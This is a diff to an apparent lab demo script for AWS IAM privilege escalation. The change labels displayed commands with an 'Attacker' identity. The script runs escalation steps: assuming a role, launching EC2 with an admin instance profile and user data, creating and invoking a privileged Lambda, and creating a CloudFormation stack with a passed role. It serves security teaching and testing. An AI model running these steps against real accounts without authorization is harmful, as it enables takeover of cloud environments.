@@ -20,12 +20,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -76,7 +78,7 @@ echo -e "${YELLOW}Step 1: Assuming the role with multiple privilege escalation p
 echo "Role ARN: $PRIVESC_ROLE_ARN"
 
 # Assume the role
-show_attack_cmd aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
@@ -88,7 +90,7 @@ echo ""
 echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
 # Check what we can do currently
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
@@ -138,7 +140,7 @@ else
 fi
 
 # Create EC2 instance
-show_attack_cmd aws ec2 run-instances --region us-west-2 --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name="pl-EC2Admin" --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'
+show_attack_cmd "Attacker" "aws ec2 run-instances --region us-west-2 --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name="pl-EC2Admin" --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'"
 aws ec2 run-instances --region us-west-2 \
     --image-id $AMI_ID \
     --instance-type t3.micro \
@@ -206,7 +208,7 @@ zip lambda_function.zip lambda_function.py
 cd - > /dev/null
 
 # Create Lambda function
-show_attack_cmd aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region us-west-2
+show_attack_cmd "Attacker" "aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region us-west-2"
 aws lambda create-function \
     --function-name privesc-demo-lambda \
     --runtime python3.9 \
@@ -222,7 +224,7 @@ if ! aws lambda wait function-active --function-name privesc-demo-lambda --regio
 fi
 
 # Invoke the Lambda function
-show_attack_cmd aws lambda invoke --function-name privesc-demo-lambda --region us-west-2 /tmp/lambda-response.json
+show_attack_cmd "Attacker" "aws lambda invoke --function-name privesc-demo-lambda --region us-west-2 /tmp/lambda-response.json"
 aws lambda invoke \
     --function-name privesc-demo-lambda \
     --region us-west-2 \
@@ -264,7 +266,7 @@ Outputs:
 EOF
 
 # Create CloudFormation stack
-show_attack_cmd aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region us-west-2
+show_attack_cmd "Attacker" "aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region us-west-2"
 aws cloudformation create-stack \
     --stack-name privesc-demo-cf-stack \
     --template-body file:///tmp/cf-template.yaml \
